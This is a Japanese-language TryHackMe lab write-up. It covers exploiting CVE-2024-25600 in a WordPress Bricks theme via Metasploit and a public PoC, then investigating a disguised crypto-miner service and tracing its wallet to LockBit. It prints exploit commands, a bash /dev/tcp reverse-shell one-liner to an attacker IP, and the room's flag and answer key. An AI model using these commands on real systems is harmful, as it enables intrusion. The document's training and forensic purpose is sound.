---
tags: [hacking, box, writeup, tryhackme, wordpress, cve, crypto-mining, threat-intel]
platform: TryHackMe
difficulty: Easy
status: completed
date: 2026-01-15
skills:
  - Nmap
  - Gobuster (HTTPS)
  - wpscan (WordPress調査)
  - CVE-2024-25600 (Bricks Builder RCE)
  - Metasploit (wp_bricks_builder_rce)
  - リバースシェル
  - systemctl プロセス調査
  - CyberChef (Hex→Base64デコード)
  - ブロックチェーン調査 (Threat Intel)
room: tryhack3mbricksheist
os: Linux
---

# TryHack3M: Bricks Heist

**プラットフォーム**: TryHackMe
**難易度**: Easy
**OS**: Linux
**テーマ**: WordPress RCE → マイニングマルウェア調査 → 脅威インテリジェンス

---

## 攻略フロー概要

```
ポートスキャン → HTTPS (443), MySQL (3306) 発見
  → Gobuster (HTTPS) → /wp-admin, /phpmyadmin 発見
  → wpscan → WordPress 6.5 + Bricks Theme 1.9.5 判明
  → CVE-2024-25600 (Bricks Builder RCE)
  → Metasploit → Meterpreter → 隠し .txt フラグ取得
  → リバースシェル → systemctl 調査 → 疑わしい ubuntu.service 発見
  → nm-inet-dialog = マイニングスクリプト
  → inet.conf の ID を Hex → Base64 → Base64 でデコード → BTC アドレス
  → blockchain.com 調査 → LockBit ウォレットとの取引を確認
```

---

## 1. ポートスキャン

```bash
nmap -sT -n $IP
```

| ポート | サービス | 備考 |
|-------|---------|------|
| 22/tcp | SSH | |
| 80/tcp | HTTP | |
| 443/tcp | HTTPS | WordPress |
| 3306/tcp | MySQL | |

---

## 2. Web列挙

### /etc/hosts 登録

```bash
echo "$IP bricks.thm" >> /etc/hosts
```

### Gobuster (HTTPS, TLS検証無効)

```bash
gobuster dir -u https://bricks.thm \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  --no-tls-validation
```

**発見したパス:**

| パス | ステータス | 備考 |
|-----|---------|------|
| `/wp-content` | 301 | WordPress コンテンツ |
| `/wp-admin` | 301 | WordPress 管理画面 |
| `/wp-includes` | 301 | |
| `/phpmyadmin` | 301 | phpMyAdmin アクセス可能 |
| `/login` | 302 | wp-login.php へリダイレクト |

> **ポイント**: HTTPS の Gobuster には `--no-tls-validation` が必要

### WordPress バージョン確認

```bash
curl -k https://bricks.thm/info.php
# → <meta name="generator" content="WordPress 6.5" />
```

### wpscan

```bash
wpscan --url https://bricks.thm/ --disable-tls-checks
```

**重要な発見:**

| 項目 | 内容 |
|-----|------|
| WordPress | **6.5** (Insecure) |
| テーマ | **Bricks 1.9.5** ← 脆弱 |
| XML-RPC | 有効 |
| WP-Cron | 有効 |

---

## 3. CVE-2024-25600 (Bricks Builder RCE)

**Bricks Builder 1.9.6 未満**: 認証不要のRCE脆弱性。

参考: https://codebook.machinarecord.com/threatreport/32027/

### Metasploit で RCE

```bash
msfconsole
msf> search CVE-2024-25600
# → exploit/multi/http/wp_bricks_builder_rce

msf> use exploit/multi/http/wp_bricks_builder_rce
msf> set rhosts https://bricks.thm
msf> set rport 443
msf> set lhost <攻撃元IP>
msf> run

# [+] Detected Bricks Builder theme version: 1.9.5
# [+] The target appears to be vulnerable.
# → Meterpreter セッション取得
```

### 隠しファイルの発見 (フラグ1)

```bash
meterpreter> ls
# Listing: /data/www/default
# → 650c844110baced87e1606453b93f22a.txt

meterpreter> cat 650c844110baced87e1606453b93f22a.txt
# → THM{fl46_650c844110baced87e1606453b93f22a}
```

**フラグ**: `THM{fl46_650c844110baced87e1606453b93f22a}`

### PoC スクリプトでも実行可能

```bash
# Python環境構築
python3 -m venv ~/myvenv
source ~/myvenv/bin/activate
pip3 install alive_progress requests bs4 rich prompt_toolkit

# CVE-2024-25600 PoC
# https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT
python CVE-2024-25600.py -u https://bricks.thm
# → Interactive shell opened successfully
```

---

## 4. リバースシェル & プロセス調査

### 安定したシェルへ切り替え

```bash
# 攻撃元で待ち受け
nc -lnvp 8888

# PoC シェルから実行
Shell> bash -c "bash -i >& /dev/tcp/<攻撃元IP>/8888 0>&1"

# → apache@ip-10-49-175-63:/data/www/default$
```

### 疑わしいサービスの発見

```bash
systemctl | grep running
# → ubuntu.service  loaded active running  TRYHACK3M
```

### サービス設定ファイルの確認

```bash
cat /etc/systemd/system/ubuntu.service
```

```ini
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

**疑わしいプロセス**: `nm-inet-dialog`（NetworkManager のふりをしたマイニングスクリプト）
**サービス名**: `ubuntu.service`

---

## 5. マイニングマルウェアの調査

### マイナーのハッシュ確認

```bash
sha256sum /lib/NetworkManager/nm-inet-dialog
# → 2d96bf6e392bbd29c2d13f6393410e4599a40e1f2fe9dc8a7b744d11f05eb756
```

### ログファイルの確認

**ログファイル**: `/lib/NetworkManager/inet.conf`

```bash
head /lib/NetworkManager/inet.conf
```

```
ID: 5757314e65474e5962484a4f656d...（長い16進数）
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
```

### ウォレットアドレスのデコード

ログ先頭の `ID:` フィールドは多重エンコードされている。

**デコード手順** (CyberChef: https://gchq.github.io/CyberChef/):

```
From Hex → From Base64 → From Base64
```

**発見したBTCアドレス:**
- `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`
- `bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa`

---

## 6. 脅威インテリジェンス調査

### Blockchain Explorer での調査

`bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa` を blockchain.com で調査。

取引履歴から関連ウォレット `bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r` を発見。

### 脅威グループの特定

OFAC (米国財務省) のサンクションリストを確認:
- https://ofac.treasury.gov/recent-actions/20240220

このウォレットアドレスは **LockBit** ランサムウェアグループのウォレットと取引があることが判明。

**脅威グループ**: `LockBit`

---

## 質問と答え

| 質問 | 答え |
|-----|------|
| 隠し .txt ファイルの内容は？ | `THM{fl46_650c844110baced87e1606453b93f22a}` |
| 疑わしいプロセスの名前は？ | `nm-inet-dialog` |
| 疑わしいプロセスのサービス名は？ | `ubuntu.service` |
| マイナーのログファイル名は？ | `inet.conf` |
| マイナーのウォレットアドレスは？ | `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa` |
| 関連する脅威グループは？ | `LockBit` |

---

## 習得スキル・学び

- **wpscan**: WordPress の脆弱なバージョン・テーマを素早く検出できる。API Token なしでも基本情報は取得可能
- **CVE-2024-25600**: Bricks Builder 1.9.6 未満の認証不要 RCE。Metasploit に公式モジュールあり
- **偽装プロセスの見つけ方**: `systemctl | grep running` で全サービスを確認し、見慣れないサービス名を調査する
- **マルウェアの偽装手口**: 正規のディレクトリ (`/lib/NetworkManager/`) に正規ファイル名風 (`nm-inet-dialog`) で配置
- **多重エンコードのデコード**: Hex → Base64 → Base64 のような多段エンコードは CyberChef が便利
- **Threat Intel (ブロックチェーン調査)**: BTC アドレスから取引を追跡し、既知の脅威グループのウォレットとの関連を確認できる

## ハマったポイント

- Gobuster に `--no-tls-validation` を付けないと HTTPS サイトをスキャンできない
- `nm-inet-dialog` は正規の NetworkManager ファイル名に似せているため気づきにくい
- ID フィールドのデコードは多段（Hex → Base64 → Base64）で、一段だけでは意味のある文字列にならない

## 参考リンク

- [TryHackMe Room](https://tryhackme.com/room/tryhack3mbricksheist)
- [CVE-2024-25600 解説](https://codebook.machinarecord.com/threatreport/32027/)
- [CVE-2024-25600 PoC](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [Blockchain Explorer](https://www.blockchain.com/explorer/)
- [OFAC LockBit 制裁リスト](https://ofac.treasury.gov/recent-actions/20240220)
- [[Tools/wpscan]]
